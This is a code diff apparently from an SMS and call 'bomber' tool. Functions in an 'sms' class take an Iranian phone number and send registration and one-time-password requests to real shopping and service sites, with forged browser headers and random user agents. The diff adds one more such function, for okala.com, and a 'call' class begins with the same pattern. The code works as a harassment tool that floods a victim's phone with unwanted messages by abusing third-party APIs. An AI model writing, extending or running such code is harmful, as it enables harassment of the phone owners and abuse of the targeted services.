@@ -1790,7 +1790,6 @@ class sms:
             
     def sabziman(phone):
         n4 = f"action=newphoneexist&phonenumber=0{phone.split('+98')[1]}"
-        
         rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
         try:
             post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
@@ -1801,7 +1800,6 @@ class sms:
             
     def tajtehran(phone):
         n4 = f"mobile=0{phone.split('+98')[1]}&password=mamad1234"
-        
         rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://tajtehran.com','referer': 'https://tajtehran.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
         try:
             post(url="https://tajtehran.com/RegisterRequest",data=n4, headers=rhead)
@@ -1812,7 +1810,6 @@ class sms:
             
     def zivanpet(phone):
         n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
-        
         rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://zivanpet.com','referer': 'https://zivanpet.com/?login=true&page=1&redirect_to=https%3A%2F%2Fzivanpet.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
 
         try:
@@ -1820,7 +1817,16 @@ class sms:
             return True
         except:
             pass
-        
+            
+    def okala(phone):
+        n4 = {"mobile":"0"+ phone.split('+98')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
+        rhead = {'user-agent': generate_user_agent(os="win")}
+        try:
+            post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json=n4, headers=rhead)
+            return True
+        except:
+            pass            
+            
 class call:
     def paklean_call(phone):
         n4 = {"username": "0"+phone.split("+98")[1]}
